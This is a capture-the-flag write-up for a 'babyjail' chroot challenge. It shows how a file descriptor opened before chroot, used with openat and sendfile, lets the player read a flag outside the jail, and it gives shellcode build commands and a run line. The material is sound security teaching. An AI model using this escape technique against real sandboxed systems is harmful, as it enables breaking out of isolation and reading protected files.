Now, the difference is the program uses the `chdir` to lock us down to jail.
Thus, we need another approach to solve the problem.

Fortunately, there is a way to do that!
The program opens the file given by the `argv[1]` before performing `chroot`.
Also, it uses the following function call when you observe via `strace`.

```
openat(AT_FDCWD, "/", O_RDONLY|O_NOFOLLOW);
```

Here is a sentence from the Linux manual page.
> If the pathname given in pathname is relative, then it is interpreted relative to the directory referred to by the file descriptor dirfd (rather than relative to the current working directory of the calling process, as is done by open() for a relative pathname).

Thus, using the file descriptor from the file `argv[1]` and the function `openat`, we can exploit the program.
The code should be as follows.
```
openat(fd_for_argv1, "./flag", O_RDONLY);
sendfile(1, 4, 0, 0x80);
```

You can see the assembly code in `shellcode.s`.
Use the following commands to get the flag.
```
gcc -nostdlib -static shellcode.s -o shellcode-elf​
objcopy --dump-section .text=shellcode-raw shellcode-elf​
/babyjail_level3_teaching1 / < ~/shellcode-raw
```